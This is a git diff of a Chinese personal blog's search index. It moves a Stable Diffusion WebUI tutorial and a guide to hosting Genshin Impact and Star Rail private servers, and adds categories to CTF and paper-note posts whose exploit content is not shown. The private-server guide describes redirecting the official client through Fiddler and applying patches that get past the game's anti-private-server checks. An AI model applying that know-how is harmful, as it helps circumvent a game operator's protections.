@@ -11,50 +11,6 @@
       </tags>
   </entry>
   <entry>
-    <title>AI绘图工具以及使用教程</title>
-    <url>/posts/75b509d1.html</url>
-    <content><![CDATA[<h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p>先放一下结果吧，本人机器只有GTX1650，所以生成的图片质量以及分辨率十分有限~</p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00001-1891544376.png" alt="00001-1891544376.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00005-1891544376.png" alt="00005-1891544376.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00009-2832915632.png" alt="00009-2832915632.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00036-3604192810.png" alt="00036-3604192810.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00050-4188726228.png" alt="00050-4188726228.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00066-114514.png" alt="00066-114514.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00069-1234567891f55fa507eb30f6a.png" alt="00069-1234567891f55fa507eb30f6a.png"></p>
-<p>大概就是这样，模型可以在<a href="https://civitai.com/">civatai</a>（需魔法）和[Hugging Face](<a href="https://huggingface.co/">Hugging Face – The AI community building the future.</a>)中找。</p>
-<h2 id="stable-diffusion-webui工具安装"><a href="#stable-diffusion-webui工具安装" class="headerlink" title="stable-diffusion-webui工具安装"></a>stable-diffusion-webui工具安装</h2><p>[stable-diffusion官网](<a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui">AUTOMATIC1111&#x2F;stable-diffusion-webui: Stable Diffusion web UI (github.com)</a>)在这里，可以参照里面的Readme文档指示进行安装。环境Windows，Linux皆可，python版本最好是3.10（否则可能有一些包会安装失败），无需手动安装pytorch，官方Readme文档里有提到点击运行webui-user.bat（Windows系统，后面都是以windows系统为例）即可自动安装相应包体组件。另外一点需要注意，如果你想要使用python虚拟环境，例如conda，可以编辑webui-user.bat中PYTHON的地址为你的conda环境python地址。</p>
-<p>在运行webui-user.bat之前，你需要先下载模型放到指定位置，这里推荐几个模型作为示例，</p>
-<ul>
-<li><a href="%5Bcivitai.com%5D(https://civitai.com/models/4468/counterfeit-v25)">counterfeit-v25</a>(需魔法）：下载得到.safesensor文件放入\stable-diffusion-webui-master\models\Stable-diffusion路径下。这个文件夹下必须至少有一个模型文件，.safesensor, .ckpt文件皆可。</li>
-</ul>
-<p>下面是几个模型文件例子，可以自行百度查找。<img src="https://img.xhacgn.com/images/2023/04/20/a40c51e8c197fdf4871351c6e6868664.png" alt="a40c51e8c197fdf4871351c6e6868664.png"></p>
-<p>然后就可以直接点击运行webui-user.bat文件，运行过程中如果出现报错，请确认你的python版本正确（一般命令行报错信息会提示你），然后如果显示安装失败，那么大概率是网络问题，请检查你的网络配置，代理是否开启，然后关闭命令行重新运行。</p>
-<p>安装好后，就可以按照命令行提示打开<a href="http://127.0.0.1:7860/%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5prompts%E4%BB%A5%E5%8F%8A%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8CAI%E7%BB%98%E5%9B%BE%E4%BA%86%EF%BC%81%E5%BD%93%E7%84%B6%E4%B8%80%E5%AE%9A%E8%A6%81%E6%B3%A8%E6%84%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E6%98%BE%E5%8D%A1%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%AC%E4%BA%BA4GB%E6%98%BE%E5%AD%98%E5%B0%B1%E5%8F%AA%E8%83%BD%E7%94%BB%E5%A4%A7%E6%A6%82900x400%E8%BF%99%E4%B8%AA%E5%88%86%E8%BE%A8%E7%8E%87%EF%BC%88%E5%8B%BE%E9%80%89hires.fix%E5%8F%82%E6%95%B0%E5%90%8E%EF%BC%89%EF%BC%8C%E4%B8%8D%E5%8B%BE%E9%80%89%E7%9A%84%E8%AF%9D%E6%9C%80%E5%A4%A7%E4%B9%9F%E5%B0%B1512x512">http://127.0.0.1:7860/然后就可以输入prompts以及各种参数进行AI绘图了！当然一定要注意自己的显卡配置，例如本人4GB显存就只能画大概900x400这个分辨率（勾选hires.fix参数后），不勾选的话最大也就512x512</a>~</p>
-<h2 id="stable-diffusion-web-ui简要介绍"><a href="#stable-diffusion-web-ui简要介绍" class="headerlink" title="stable diffusion web ui简要介绍"></a>stable diffusion web ui简要介绍</h2><p><img src="https://img.xhacgn.com/images/2023/04/20/screenshot.png" alt="screenshot.png"></p>
-<ul>
-<li>stable diffusion checkpoint：你下载的模型，包含在上面提到的文件夹下的所有模型文件，可以选择任何一个模型进行加载。</li>
-<li>Prompts：提示词，AI会根据该提示词进行绘制</li>
-<li>Negative Prompts：负面提示词，AI会尽量避免里面的关键词</li>
-<li>Sampling method：数据采样方式，没什么大影响</li>
-<li>Sampling steps：采样步数，20-50就可以了，当然你再多一些也没关系，就是运行时间会久一些，还没试过效果会不会有明显改善</li>
-<li><strong>Restore faces：</strong>在图象生成后再对面部进行优化，<strong>十分重要！！！</strong></li>
-<li><strong>Hires.fix：</strong>可以将本来较小分辨率的图片再扩展成较大分辨率的图片</li>
-<li>Batch Count：训练几张图片，串行生成</li>
-<li>Batch Size：一次训练几张图片，并行生成</li>
-<li>CFG Scale：AI绘图对Prompt的倾向性有多强。</li>
-<li>Seed：种子，你可以按照我的世界的地图种子来理解。</li>
-</ul>
-<p>可以在<a href="https://civitai.com/">civatai</a>网站中找到自己喜欢的图片，里面会有相应的Prompts等参数，一般而言参数一模一样的话，产生的图也会比较相似。</p>
-<p>下面给一个通用Prompts，用于画二次元少女图的</p>
-<p>Prompt：masterpiece，beat quality，1girl</p>
-<p>Negative Prompt：nsfw,blush,lowres, bad anatomy, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts,signature, watermark, username, blurry, artist name,bad feet,big head,fused body,multiple hands,multiple legs,multiple hands,multiple breast,multiple lower legs,multiple thighs,fused body,twist body</p>
-<p>其他参数自己调就可以了。（只要不太过分都是没问题的~~~）</p>
-]]></content>
-      <tags>
-        <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB</title>
     <url>/posts/30b50265.html</url>
     <content><![CDATA[<p>本文转载自[BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB](<a href="https://cloud.tencent.com/developer/article/1036206">BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB - 腾讯云开发者社区-腾讯云 (tencent.com)</a>)</p>
@@ -135,6 +91,50 @@
 ]]></content>
       <tags>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AI绘图工具以及使用教程</title>
+    <url>/posts/75b509d1.html</url>
+    <content><![CDATA[<h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p>先放一下结果吧，本人机器只有GTX1650，所以生成的图片质量以及分辨率十分有限~</p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00001-1891544376.png" alt="00001-1891544376.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00005-1891544376.png" alt="00005-1891544376.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00009-2832915632.png" alt="00009-2832915632.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00036-3604192810.png" alt="00036-3604192810.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00050-4188726228.png" alt="00050-4188726228.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00066-114514.png" alt="00066-114514.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00069-1234567891f55fa507eb30f6a.png" alt="00069-1234567891f55fa507eb30f6a.png"></p>
+<p>大概就是这样，模型可以在<a href="https://civitai.com/">civatai</a>（需魔法）和[Hugging Face](<a href="https://huggingface.co/">Hugging Face – The AI community building the future.</a>)中找。</p>
+<h2 id="stable-diffusion-webui工具安装"><a href="#stable-diffusion-webui工具安装" class="headerlink" title="stable-diffusion-webui工具安装"></a>stable-diffusion-webui工具安装</h2><p>[stable-diffusion官网](<a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui">AUTOMATIC1111&#x2F;stable-diffusion-webui: Stable Diffusion web UI (github.com)</a>)在这里，可以参照里面的Readme文档指示进行安装。环境Windows，Linux皆可，python版本最好是3.10（否则可能有一些包会安装失败），无需手动安装pytorch，官方Readme文档里有提到点击运行webui-user.bat（Windows系统，后面都是以windows系统为例）即可自动安装相应包体组件。另外一点需要注意，如果你想要使用python虚拟环境，例如conda，可以编辑webui-user.bat中PYTHON的地址为你的conda环境python地址。</p>
+<p>在运行webui-user.bat之前，你需要先下载模型放到指定位置，这里推荐几个模型作为示例，</p>
+<ul>
+<li><a href="%5Bcivitai.com%5D(https://civitai.com/models/4468/counterfeit-v25)">counterfeit-v25</a>(需魔法）：下载得到.safesensor文件放入\stable-diffusion-webui-master\models\Stable-diffusion路径下。这个文件夹下必须至少有一个模型文件，.safesensor, .ckpt文件皆可。</li>
+</ul>
+<p>下面是几个模型文件例子，可以自行百度查找。<img src="https://img.xhacgn.com/images/2023/04/20/a40c51e8c197fdf4871351c6e6868664.png" alt="a40c51e8c197fdf4871351c6e6868664.png"></p>
+<p>然后就可以直接点击运行webui-user.bat文件，运行过程中如果出现报错，请确认你的python版本正确（一般命令行报错信息会提示你），然后如果显示安装失败，那么大概率是网络问题，请检查你的网络配置，代理是否开启，然后关闭命令行重新运行。</p>
+<p>安装好后，就可以按照命令行提示打开<a href="http://127.0.0.1:7860/%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5prompts%E4%BB%A5%E5%8F%8A%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8CAI%E7%BB%98%E5%9B%BE%E4%BA%86%EF%BC%81%E5%BD%93%E7%84%B6%E4%B8%80%E5%AE%9A%E8%A6%81%E6%B3%A8%E6%84%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E6%98%BE%E5%8D%A1%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%AC%E4%BA%BA4GB%E6%98%BE%E5%AD%98%E5%B0%B1%E5%8F%AA%E8%83%BD%E7%94%BB%E5%A4%A7%E6%A6%82900x400%E8%BF%99%E4%B8%AA%E5%88%86%E8%BE%A8%E7%8E%87%EF%BC%88%E5%8B%BE%E9%80%89hires.fix%E5%8F%82%E6%95%B0%E5%90%8E%EF%BC%89%EF%BC%8C%E4%B8%8D%E5%8B%BE%E9%80%89%E7%9A%84%E8%AF%9D%E6%9C%80%E5%A4%A7%E4%B9%9F%E5%B0%B1512x512">http://127.0.0.1:7860/然后就可以输入prompts以及各种参数进行AI绘图了！当然一定要注意自己的显卡配置，例如本人4GB显存就只能画大概900x400这个分辨率（勾选hires.fix参数后），不勾选的话最大也就512x512</a>~</p>
+<h2 id="stable-diffusion-web-ui简要介绍"><a href="#stable-diffusion-web-ui简要介绍" class="headerlink" title="stable diffusion web ui简要介绍"></a>stable diffusion web ui简要介绍</h2><p><img src="https://img.xhacgn.com/images/2023/04/20/screenshot.png" alt="screenshot.png"></p>
+<ul>
+<li>stable diffusion checkpoint：你下载的模型，包含在上面提到的文件夹下的所有模型文件，可以选择任何一个模型进行加载。</li>
+<li>Prompts：提示词，AI会根据该提示词进行绘制</li>
+<li>Negative Prompts：负面提示词，AI会尽量避免里面的关键词</li>
+<li>Sampling method：数据采样方式，没什么大影响</li>
+<li>Sampling steps：采样步数，20-50就可以了，当然你再多一些也没关系，就是运行时间会久一些，还没试过效果会不会有明显改善</li>
+<li><strong>Restore faces：</strong>在图象生成后再对面部进行优化，<strong>十分重要！！！</strong></li>
+<li><strong>Hires.fix：</strong>可以将本来较小分辨率的图片再扩展成较大分辨率的图片</li>
+<li>Batch Count：训练几张图片，串行生成</li>
+<li>Batch Size：一次训练几张图片，并行生成</li>
+<li>CFG Scale：AI绘图对Prompt的倾向性有多强。</li>
+<li>Seed：种子，你可以按照我的世界的地图种子来理解。</li>
+</ul>
+<p>可以在<a href="https://civitai.com/">civatai</a>网站中找到自己喜欢的图片，里面会有相应的Prompts等参数，一般而言参数一模一样的话，产生的图也会比较相似。</p>
+<p>下面给一个通用Prompts，用于画二次元少女图的</p>
+<p>Prompt：masterpiece，beat quality，1girl</p>
+<p>Negative Prompt：nsfw,blush,lowres, bad anatomy, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts,signature, watermark, username, blurry, artist name,bad feet,big head,fused body,multiple hands,multiple legs,multiple hands,multiple breast,multiple lower legs,multiple thighs,fused body,twist body</p>
+<p>其他参数自己调就可以了。（只要不太过分都是没问题的~~~）</p>
+]]></content>
+      <tags>
+        <tag>教程</tag>
       </tags>
   </entry>
   <entry>
@@ -250,11 +250,33 @@
 
 <h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2>
 ]]></content>
+      <categories>
+        <category>CTF练习</category>
+      </categories>
       <tags>
         <tag>教程</tag>
         <tag>CTF</tag>
         <tag>PWN</tag>
         <tag>格式化字符串漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>某二次元游戏私服搭建总结</title>
+    <url>/posts/af718253.html</url>
+    <content><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>经过大概几个小时的配置环境并debug，终于把Genshin Impact和星穹铁道的私服配置好了。中间也学到了很多东西，以下对整个过程做一个总结。</p>
+<h2 id="需要的环境"><a href="#需要的环境" class="headerlink" title="需要的环境"></a><strong>需要的环境</strong></h2><p>Genshin Impact3.4客户端（光是这个就很难找，最后在迅雷上找到了种子），Grasscutter1.4.6最新版，Fiddler最新版，Grasscutter-resources3.4版本，mongod数据库最新版</p>
+<h2 id="需要用到的知识"><a href="#需要用到的知识" class="headerlink" title="需要用到的知识"></a><strong>需要用到的知识</strong></h2><p>（非必要，但懂的话做起来更顺利，懂的话就能够进行简单的debug）：<br>1.了解网络代理，证书的相关知识与原理；<br>2.C，JavaScript，shell语言；（能看懂即可）<br>3.了解数据库的运行机制和内部构造；<br>4.了解服务器与客户端与数据库的数据交互过程与方法，网络端口通信；<br>5.会使用命令行，会配置环境变量；<br>6.能科学上网（主要用来上github，不过有时github不用魔法也能打开~）<br>上面所提到的知识主要用于在搭建过程中出现了问题时debug，当然网上也有各种教程，不过网上教程不一定就可以解决你搭建过程出现的问题。所以up强烈建议有上面的知识基础的可以去搞，没有的话搭建起来会很痛苦（来自up本人一年前和一年后的学完上面知识后的亲身体验）。</p>
+<h2 id="私服运行主要原理"><a href="#私服运行主要原理" class="headerlink" title="私服运行主要原理"></a><strong>私服运行主要原理</strong></h2><p>原神由于之前工作人员失误导致了私服的产生，目前私服的运行主要由三部分组成，分别是服务器端，客户端和网络代理端，服务器端是Grasscutter大佬自己手搓出来的，客户端是官方的版本包，网络代理用于阻断客户端与官方服务器的连接，并将连接重定向到本地搭建的Grasscutter，也就是私服。</p>
+<h2 id="配置环境主要步骤"><a href="#配置环境主要步骤" class="headerlink" title="配置环境主要步骤"></a><strong>配置环境主要步骤</strong></h2><p>1.从github上下载Grasscutter最新版1.4.6版本，还需要gitlab上与之配套的resources和proto，注意版本对应（不对应会导致编译出错等问题，即使成功可能在后面也会有一些问题），resources指Grasscutter搭建所需的资源，proto主要可以修复进入游戏后角色技能不能治疗的bug。<br>2.根据github内Grasscutter的ReadMe文档将服务器搭建好。并且根据其WiKi搭好Fiddler（用于实现网络代理功能）和mongod数据库。<br>3.从网上下载Genshin Impact3.4包，注意版本对应，Grasscutter1.4.6对应原神3.4版本。版本不对应可能会导致创建账号后卡在进入界面，一直白屏。</p>
+<h2 id="运行主要步骤"><a href="#运行主要步骤" class="headerlink" title="运行主要步骤"></a><strong>运行主要步骤</strong></h2><p>1.在github上Grasscutter有教程，不仔细展开，在mongod.exe所在目录terminal，运行命令打开数据库，只要terminal界面运行不中断就表明数据库配置成功。<br>2.在Grasscutter文件夹打开命令行，输入命令启动服务器。显示服务器以成功运行，没有报错即表示服务器启动成功，注意要先开数据库，再开服务器，否则服务器端会报错。服务器端开启后在命令行输入命令创建账户，命令在github上都有，不再列出。<br>3.打开Fiddler，添加Grasscutter提供的配置规则，并且修改设置允许https解密，修改默认端口为任意值（只要不是默认8888就可，up也不知道为什么~）。<br>4.打开原神3.4客户端，注意此处为自己下载的客户端内部的yuanshen.exe。进入登录页面Fiddler会有弹窗点击确认即可，这里是指是否信任对方证书，而此时对方是我们自己搭建的服务器，所以直接信任就可。点击确认后，就可以正常登陆自己在服务器创建的用户了。</p>
+<h2 id="崩坏：星穹铁道私服"><a href="#崩坏：星穹铁道私服" class="headerlink" title="崩坏：星穹铁道私服"></a><strong>崩坏：星穹铁道私服</strong></h2><p>总体思路与原神差不多，并且要比原神简单很多（因为客户端是测试服的包，所以加密防护做的并没有原神好，不需要打补丁），具体过程只需把客户端改为星穹铁道测试服版本，然后运行数据库，运行服务器（这里你需要去网上找资源，Grasscutter服务器是java搭建的，而星穹铁道是用node搭建的，up因为用过node，所以很快就配置完成了），但由于网上基本没有资源，并且教程也极少，而且其也即将开服等等原因，就不再赘述了。</p>
+<h2 id="搭建过程中遇到的问题"><a href="#搭建过程中遇到的问题" class="headerlink" title="搭建过程中遇到的问题"></a><strong>搭建过程中遇到的问题</strong></h2><p><strong>星穹铁道：</strong><br>  1.运行服务器端报错显示版本不对；<br>  解决办法：将显示版本不对的包更新。<br>  2.打开客户端后显示全局分发错误。<br>  解决办法：是代理出现问题，更改其规则并且修改设置中开放端口。<br>  3.同2的另一种原因。似乎是使用了校园网，更改后问题解决。</p>
+<p><strong>原神：</strong><br>  1.进入后显示4214报错；<br>  原因：原神在2.8版本后就开始增加了客户端对服务器的检测，目的就是打击私服<br>  解决办法：Grasscutter大佬已经打了补丁，不过不同版本补丁也不尽相同，并且目前最新版本3.5版本也暂时没有，3.4版本似乎是使用了公私钥加密来做了密钥协商，不过Grasscutter大佬还是把补丁搓出来了（膜~~~）根据github上教程安装补丁即可<br>  2.打补丁后发现可以登录但进不去，卡在进入界面，一直白屏；<br>  原因：大概率是因为版本不对应，网上有说是因为udp连接端口没打开，代理有问题的基本全是错的（如果你是服务器在自己本地的话）。<br>  解决方法：检查一遍各个资源版本是否对应。<br>  3.更换资源后编译服务器报错；<br>  原因：之前已经编译过的话，服务器内部就已经存储了数据和配置，需要把这些都删掉再编译；<br>  解决办法：删去data，cache文件夹，还是不行就重新下载Grasscutter，重新编译。</p>
+<p>另外还需要检查是否关闭了vpn，debug时建议查看数据库，服务器端和fiddler的输出信息来判断。</p>
+<h2 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a><strong>总结感想</strong></h2><p>整个私服配置下来还是很繁琐的，并且搭建过程中需要大量的时间debug，up在搭建过程中就遇到了各种各样的问题，并且网上教程解决方案较少，并且大多数都是不对的，如果了解上面所提到的那些知识的话，debug的时间就会大幅缩小，并且你也会在搭建过程中作很好的实践，并学到很多新东西。up也是在多次查询博客教程无果后选择自己去解决，然后发现大学学的课程还真有用~~~。<br>本篇文章主要用作up本人学习总结用，也希望能给正在搭建私服的人思路，并且up在此也建议没有计算机基础的同学尽量不要碰，否则会变得不幸。</p>
+]]></content>
+      <tags>
+        <tag>教程</tag>
       </tags>
   </entry>
   <entry>
@@ -297,31 +319,11 @@
 <p>成功获取flag</p>
 <img src="/posts/daa10577/result.png" class="" title="result">
 ]]></content>
+      <categories>
+        <category>CTF练习</category>
+      </categories>
       <tags>
-        <tag>教程</tag>
-        <tag>CTF</tag>
         <tag>PWN</tag>
-        <tag>ROP攻击</tag>
-        <tag>libc泄漏</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>某二次元游戏私服搭建总结</title>
-    <url>/posts/af718253.html</url>
-    <content><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>经过大概几个小时的配置环境并debug，终于把Genshin Impact和星穹铁道的私服配置好了。中间也学到了很多东西，以下对整个过程做一个总结。</p>
-<h2 id="需要的环境"><a href="#需要的环境" class="headerlink" title="需要的环境"></a><strong>需要的环境</strong></h2><p>Genshin Impact3.4客户端（光是这个就很难找，最后在迅雷上找到了种子），Grasscutter1.4.6最新版，Fiddler最新版，Grasscutter-resources3.4版本，mongod数据库最新版</p>
-<h2 id="需要用到的知识"><a href="#需要用到的知识" class="headerlink" title="需要用到的知识"></a><strong>需要用到的知识</strong></h2><p>（非必要，但懂的话做起来更顺利，懂的话就能够进行简单的debug）：<br>1.了解网络代理，证书的相关知识与原理；<br>2.C，JavaScript，shell语言；（能看懂即可）<br>3.了解数据库的运行机制和内部构造；<br>4.了解服务器与客户端与数据库的数据交互过程与方法，网络端口通信；<br>5.会使用命令行，会配置环境变量；<br>6.能科学上网（主要用来上github，不过有时github不用魔法也能打开~）<br>上面所提到的知识主要用于在搭建过程中出现了问题时debug，当然网上也有各种教程，不过网上教程不一定就可以解决你搭建过程出现的问题。所以up强烈建议有上面的知识基础的可以去搞，没有的话搭建起来会很痛苦（来自up本人一年前和一年后的学完上面知识后的亲身体验）。</p>
-<h2 id="私服运行主要原理"><a href="#私服运行主要原理" class="headerlink" title="私服运行主要原理"></a><strong>私服运行主要原理</strong></h2><p>原神由于之前工作人员失误导致了私服的产生，目前私服的运行主要由三部分组成，分别是服务器端，客户端和网络代理端，服务器端是Grasscutter大佬自己手搓出来的，客户端是官方的版本包，网络代理用于阻断客户端与官方服务器的连接，并将连接重定向到本地搭建的Grasscutter，也就是私服。</p>
-<h2 id="配置环境主要步骤"><a href="#配置环境主要步骤" class="headerlink" title="配置环境主要步骤"></a><strong>配置环境主要步骤</strong></h2><p>1.从github上下载Grasscutter最新版1.4.6版本，还需要gitlab上与之配套的resources和proto，注意版本对应（不对应会导致编译出错等问题，即使成功可能在后面也会有一些问题），resources指Grasscutter搭建所需的资源，proto主要可以修复进入游戏后角色技能不能治疗的bug。<br>2.根据github内Grasscutter的ReadMe文档将服务器搭建好。并且根据其WiKi搭好Fiddler（用于实现网络代理功能）和mongod数据库。<br>3.从网上下载Genshin Impact3.4包，注意版本对应，Grasscutter1.4.6对应原神3.4版本。版本不对应可能会导致创建账号后卡在进入界面，一直白屏。</p>
-<h2 id="运行主要步骤"><a href="#运行主要步骤" class="headerlink" title="运行主要步骤"></a><strong>运行主要步骤</strong></h2><p>1.在github上Grasscutter有教程，不仔细展开，在mongod.exe所在目录terminal，运行命令打开数据库，只要terminal界面运行不中断就表明数据库配置成功。<br>2.在Grasscutter文件夹打开命令行，输入命令启动服务器。显示服务器以成功运行，没有报错即表示服务器启动成功，注意要先开数据库，再开服务器，否则服务器端会报错。服务器端开启后在命令行输入命令创建账户，命令在github上都有，不再列出。<br>3.打开Fiddler，添加Grasscutter提供的配置规则，并且修改设置允许https解密，修改默认端口为任意值（只要不是默认8888就可，up也不知道为什么~）。<br>4.打开原神3.4客户端，注意此处为自己下载的客户端内部的yuanshen.exe。进入登录页面Fiddler会有弹窗点击确认即可，这里是指是否信任对方证书，而此时对方是我们自己搭建的服务器，所以直接信任就可。点击确认后，就可以正常登陆自己在服务器创建的用户了。</p>
-<h2 id="崩坏：星穹铁道私服"><a href="#崩坏：星穹铁道私服" class="headerlink" title="崩坏：星穹铁道私服"></a><strong>崩坏：星穹铁道私服</strong></h2><p>总体思路与原神差不多，并且要比原神简单很多（因为客户端是测试服的包，所以加密防护做的并没有原神好，不需要打补丁），具体过程只需把客户端改为星穹铁道测试服版本，然后运行数据库，运行服务器（这里你需要去网上找资源，Grasscutter服务器是java搭建的，而星穹铁道是用node搭建的，up因为用过node，所以很快就配置完成了），但由于网上基本没有资源，并且教程也极少，而且其也即将开服等等原因，就不再赘述了。</p>
-<h2 id="搭建过程中遇到的问题"><a href="#搭建过程中遇到的问题" class="headerlink" title="搭建过程中遇到的问题"></a><strong>搭建过程中遇到的问题</strong></h2><p><strong>星穹铁道：</strong><br>  1.运行服务器端报错显示版本不对；<br>  解决办法：将显示版本不对的包更新。<br>  2.打开客户端后显示全局分发错误。<br>  解决办法：是代理出现问题，更改其规则并且修改设置中开放端口。<br>  3.同2的另一种原因。似乎是使用了校园网，更改后问题解决。</p>
-<p><strong>原神：</strong><br>  1.进入后显示4214报错；<br>  原因：原神在2.8版本后就开始增加了客户端对服务器的检测，目的就是打击私服<br>  解决办法：Grasscutter大佬已经打了补丁，不过不同版本补丁也不尽相同，并且目前最新版本3.5版本也暂时没有，3.4版本似乎是使用了公私钥加密来做了密钥协商，不过Grasscutter大佬还是把补丁搓出来了（膜~~~）根据github上教程安装补丁即可<br>  2.打补丁后发现可以登录但进不去，卡在进入界面，一直白屏；<br>  原因：大概率是因为版本不对应，网上有说是因为udp连接端口没打开，代理有问题的基本全是错的（如果你是服务器在自己本地的话）。<br>  解决方法：检查一遍各个资源版本是否对应。<br>  3.更换资源后编译服务器报错；<br>  原因：之前已经编译过的话，服务器内部就已经存储了数据和配置，需要把这些都删掉再编译；<br>  解决办法：删去data，cache文件夹，还是不行就重新下载Grasscutter，重新编译。</p>
-<p>另外还需要检查是否关闭了vpn，debug时建议查看数据库，服务器端和fiddler的输出信息来判断。</p>
-<h2 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a><strong>总结感想</strong></h2><p>整个私服配置下来还是很繁琐的，并且搭建过程中需要大量的时间debug，up在搭建过程中就遇到了各种各样的问题，并且网上教程解决方案较少，并且大多数都是不对的，如果了解上面所提到的那些知识的话，debug的时间就会大幅缩小，并且你也会在搭建过程中作很好的实践，并学到很多新东西。up也是在多次查询博客教程无果后选择自己去解决，然后发现大学学的课程还真有用~~~。<br>本篇文章主要用作up本人学习总结用，也希望能给正在搭建私服的人思路，并且up在此也建议没有计算机基础的同学尽量不要碰，否则会变得不幸。</p>
-]]></content>
-      <tags>
-        <tag>教程</tag>
       </tags>
   </entry>
   <entry>
@@ -538,6 +540,9 @@
 </li>
 </ol>
 ]]></content>
+      <categories>
+        <category>CTF练习</category>
+      </categories>
       <tags>
         <tag>CTF</tag>
         <tag>PWN</tag>
@@ -627,11 +632,17 @@
 </li>
 </ol>
 ]]></content>
+      <categories>
+        <category>CTF练习</category>
+      </categories>
       <tags>
         <tag>CTF</tag>
         <tag>PWN</tag>
-        <tag>Return to Libc</tag>
-        <tag>SEED Lab</tag>
+        <tag>Return</tag>
+        <tag>to</tag>
+        <tag>Libc</tag>
+        <tag>SEED</tag>
+        <tag>Lab</tag>
       </tags>
   </entry>
   <entry>
@@ -736,11 +747,16 @@
 
 <p>成功获取root shell</p>
 <img src="/posts/5a0832a9/image-20231211195911628.png" class="" title="image-20231211195911628">]]></content>
+      <categories>
+        <category>CTF练习</category>
+      </categories>
       <tags>
         <tag>CTF</tag>
         <tag>PWN</tag>
-        <tag>SEED Lab</tag>
-        <tag>Format String</tag>
+        <tag>SEED</tag>
+        <tag>Lab</tag>
+        <tag>Format</tag>
+        <tag>String</tag>
       </tags>
   </entry>
   <entry>
@@ -787,6 +803,9 @@
 <img src="/posts/5786d6f8/image-20231218190107050.png" class="" title="image-20231218190107050">
 
 <img src="/posts/5786d6f8/image-20231218190125898.png" class="" title="image-20231218190125898">]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
       <tags>
         <tag>IS</tag>
         <tag>IoT</tag>
@@ -863,6 +882,9 @@
 </li>
 </ol>
 ]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
       <tags>
         <tag>IS</tag>
         <tag>IoT</tag>
@@ -932,6 +954,9 @@
 </li>
 </ol>
 ]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
       <tags>
         <tag>IS</tag>
         <tag>IoT</tag>
@@ -1004,6 +1029,9 @@
 <h5 id="Explorative-Execution"><a href="#Explorative-Execution" class="headerlink" title="Explorative Execution"></a>Explorative Execution</h5><p>前面提到了SR由于频繁变化的特性，导致每次需要调用其值时，都无法确定其正确值，因此采用了探索式执行的方式来确定SR的最优解</p>
 <p>通过遍历SR的可能取值（32位只考虑同时只存在一个bit为1的情况），共32种情况，只需新建32个线程同时运行，查看哪个线程运行效果最好来确定结果（通过查看在跳出函数时的情况来判断）</p>
 ]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
       <tags>
         <tag>IS</tag>
         <tag>IoT</tag>
@@ -1073,6 +1101,9 @@
 <p>FDT：<a href="https://blog.csdn.net/qq_44370676/article/details/120836743">https://blog.csdn.net/qq_44370676/article/details/120836743</a></p>
 <p>AFL（基于coverage_guide的fuzzing工具）<a href="https://www.freebuf.com/articles/system/191543.html">https://www.freebuf.com/articles/system/191543.html</a></p>
 ]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
       <tags>
         <tag>IoT</tag>
         <tag>Fuzz</tag>
@@ -1127,6 +1158,9 @@
 <li>用户定义：例如断言失败操作。</li>
 </ul>
 ]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
       <tags>
         <tag>IoT</tag>
         <tag>Fuzz</tag>
@@ -1166,6 +1200,9 @@
 </ol>
 <h3 id="User-Interface"><a href="#User-Interface" class="headerlink" title="User Interface"></a>User Interface</h3><p>提供了用户界面的ui。</p>
 ]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
       <tags>
         <tag>IoT</tag>
         <tag>Fuzz</tag>
@@ -1190,6 +1227,9 @@
 
 <p>一轮fuzzing结束后，根据反馈调整输入，开始下一阶段fuzzing。</p>
